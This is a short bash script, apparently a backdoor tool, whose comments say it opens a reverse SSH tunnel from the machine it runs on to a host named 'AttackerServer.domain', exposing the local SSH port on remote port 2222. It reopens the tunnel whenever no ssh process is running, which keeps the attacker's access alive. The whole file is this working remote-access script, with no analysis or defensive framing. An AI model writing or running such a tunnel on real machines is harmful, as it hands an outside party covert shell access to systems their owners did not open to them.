#!/bin/bash
#
# Try to establish a reverse ssh tunnel to the AttackerServer.domain.
# 
#  It connects to AttackerServer on port 22 and set up a reverse tunnel 
#  from remote port 2222 (server) to local port 22 (who launch the cmd).
#  
#  Once successfully completed on the server side just launch:
#  $ ssh -l <remote_user> -p 2222 localhost
#
createTunnel() {
  /usr/bin/ssh -N -R 2222:localhost:22 pi@AttackerServer.domain
  if [[ $? -eq 0 ]]; then
    echo Tunnel created successfully
  else
    echo An error occurred creating a tunnel. RC is $?
  fi
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
  echo Creating new tunnel ...
  createTunnel
fi
